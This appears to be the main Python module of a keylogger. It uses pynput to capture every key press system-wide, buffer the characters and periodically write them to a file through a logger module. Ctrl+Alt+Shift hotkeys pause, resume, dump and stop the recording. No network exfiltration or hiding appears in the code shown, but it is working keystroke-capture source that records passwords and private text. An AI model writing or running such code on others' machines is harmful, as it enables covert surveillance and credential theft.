import asyncio
import threading
from time import sleep

from util import utilities
from logger import logger
from pynput import keyboard
from pynput.keyboard import Key, Listener, KeyCode, Controller
from countdown import Countdown
from decorators.decorators import catch_exception

S_code = 83
P_code = 80
D_code = 68
T_code = 84

is_ctrl_pressed:bool = False
is_alt_pressed:bool = False
is_shift_pressed:bool = False
should_register:bool = True
key_buffer:list[str] = list()
buffer_capacity:int = 300
lang_change_listener:Listener
_keyboard = Controller()


@catch_exception(print_trace=True)
def on_pressed(key):
    global key_buffer, is_alt_pressed, is_shift_pressed, is_ctrl_pressed
    if isinstance(key, KeyCode):
        if is_ctrl_pressed or is_alt_pressed:
            __check_for_special_handling(ord(key.char))
        else:
            if should_register:
                print(key.char)
                key_buffer.append(key.char)
    else:
        if __check_for_combination_key(key):
            return

        if should_register:
            if key == Key.space:
                print(" ")
                key_buffer.append(" ")
            elif key == Key.backspace:
                if len(key_buffer) > 0:
                    del key_buffer[-1]
            elif key == Key.enter:
                print("\n")
                key_buffer.append("\n")

    if len(key_buffer) == buffer_capacity:
        logger.log_to_file(buffer=key_buffer)


def on_release(key):
    if key == Key.ctrl_l:
        global is_ctrl_pressed
        is_ctrl_pressed = False
    elif key == Key.alt_l:
        global is_alt_pressed
        is_alt_pressed = False
    elif key == Key.shift_l:
        global is_shift_pressed
        is_shift_pressed = False


def __check_for_combination_key(key) -> bool:
    global is_ctrl_pressed, is_alt_pressed, is_shift_pressed

    if key == Key.ctrl_l:
        is_ctrl_pressed = True
        return True
    elif key == Key.alt_l:
        is_alt_pressed = True
        return True
    elif key == Key.shift_l:
        is_shift_pressed = True
        return True

    return False


def __check_for_special_handling(unicode):
    if is_alt_pressed and is_shift_pressed and is_ctrl_pressed:
        global should_register,key_buffer

        if   unicode == P_code:     #stop recording and timers
            should_register = False
        elif unicode == S_code:     #start recording and timers again
            should_register = True
        elif unicode == D_code:     #force dump contents of array in file
            logger.log_to_file(key_buffer)
            key_buffer = list()
        elif unicode == T_code:     #wait for logging to complete if ongoing, and exit
            __exit_safely()


def __exit_safely():
    count = 0
    while logger.is_writing and count < 5:
        count += 1
        sleep(0.1)
    __shutdown_executors()
    if count == 5:
        exit(-1)
    exit(0)


def __init_executors():
    logger.init()
    # Countdown.make_and_start("one", 0.7, lambda : print("ONE callback"))
    # Countdown.make_and_start("two", 1, lambda : print("TWO callback"))


def __shutdown_executors():
    logger.shutdown()
    Countdown.stop_all()


# ________________________________________ START _________________________________________________


__init_executors()

with keyboard.Listener(on_press=on_pressed, on_release=on_release) as listener:
    listener.join()

